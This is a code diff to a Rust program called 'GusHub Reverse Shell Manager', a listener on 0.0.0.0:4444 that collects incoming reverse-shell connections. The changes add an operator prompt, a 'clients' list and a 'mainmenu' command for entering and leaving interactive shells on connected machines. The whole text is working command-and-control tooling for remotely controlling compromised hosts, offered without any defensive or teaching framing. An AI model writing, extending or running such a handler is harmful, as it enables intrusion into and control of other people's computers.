@@ -7,6 +7,7 @@ use std::sync::{Arc, Mutex};
 const HOST: &str = "0.0.0.0";
 const PORT: u32 = 4444;
 
+
 #[derive(Debug)]
 struct Client {
     stream: TcpStream,
@@ -57,10 +58,19 @@ fn main() {
     print!("\
     GusHub\n\
     Reverse Shell Manager\n\
+    Use 'clients' to show connected clients\n\
+    Use 'mainmenu' to exit an interactive shell\n\
+    Input their number to interact\n\
     ");
 
     loop {
 
+        print!("GusHub >");
+        stdout().flush().unwrap();
+        let mut command = String::new();
+        stdin().read_line(&mut command).expect("stdin failure");
+
+        // We now clear out the buffer from the accepting thread
         {
             let mut cb = client_buffer.lock().unwrap();
             while let Some(client) = cb.pop() {
@@ -68,17 +78,21 @@ fn main() {
             }
         }
 
-        if clients.len() == 0 {
+        // Show clients if it was requested
+        if command.trim() == "clients" {
+            if clients.len() == 0 {
+                println!("No connected clients!");
+            }
+
+            for (i, client) in clients.iter().enumerate() {
+                println!("({}) - ({})", i + 1, client.address());
+            }
+
             continue;
         }
 
-        for (i, client) in clients.iter().enumerate() {
-            println!("({}) - ({})", i, client.address());
-        }
-
-        let mut input = String::new();
-        stdin().read_line(&mut input).expect("stdin failure");
-        let choice = match input.trim().parse::<usize>() {
+        // If the command was a number, drop 
+        let choice = match command.trim().parse::<usize>() {
             Ok(n) if n <= 0 || n > clients.len() => continue,
             Err(_) => continue,
             Ok(n) => n
@@ -96,23 +110,25 @@ fn handle_connection(client: &Client) -> Result<(), std::io::Error> {
 
     let writer_t = thread::spawn(move || {
         loop {
-            let mut buf = String::new();
-            stdin().read_line(&mut buf).unwrap();
-            if buf == "clientlist" {break;}
-            buf += "\n";
-            writer.write_all(buf.as_bytes()).unwrap();
+            let mut buf = vec![0; 1024];
+            let n = stdin().read(&mut buf).unwrap();
+            if String::from_utf8_lossy(&buf[..n]).trim() == "mainmenu" {break;} // Figure this out later
+            writer.write_all(&buf[..n]).unwrap();
         }
     });
 
     thread::spawn(move || {
         loop {
-            if let Err(_) = receiver.try_recv() {break;}
+            if let Ok(_) = receiver.try_recv() {break;}
 
             let mut buf = vec![0; 1024];
             match reader.read(&mut buf) {
                 Ok(0) => break,
                 Err(_) => break,
-                Ok(n) => stdout().write_all(&buf[..n]).unwrap(),
+                Ok(n) => {
+                    stdout().write_all(&buf[..n]).unwrap();
+                    stdout().flush().unwrap();
+                },
             }
         }
     });
